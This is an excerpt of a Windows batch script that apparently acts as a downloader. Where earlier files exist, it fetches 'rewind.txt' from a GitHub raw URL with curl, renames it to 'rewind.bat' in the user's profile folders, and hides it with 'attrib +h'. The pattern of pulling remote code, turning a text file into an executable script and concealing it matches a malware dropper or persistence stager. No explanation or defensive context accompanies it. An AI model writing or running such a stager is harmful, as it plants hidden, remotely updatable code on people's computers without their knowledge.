...
IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
	...
	curl -L -o "C:\Users\%USERNAME%\configuration\rewind.txt" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.txt"
	rename "C:\Users\%USERNAME%\configuration\rewind.txt" "rewind.bat"
	...
	attrib +h "C:\Users\%USERNAME%\configuration\rewind.bat"
	goto rewind_2
)
...
IF EXIST "C:\Users\%USERNAME%\rewind.bat" (
	...
	set "FILE_TXT=C:\Users\%USERNAME%\rewind.txt"
	curl -L -o "%FILE_TXT%" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.txt"
	rename "%FILE_TXT%" "rewind.bat"
	attrib +h "C:\Users\%USERNAME%\rewind.bat"
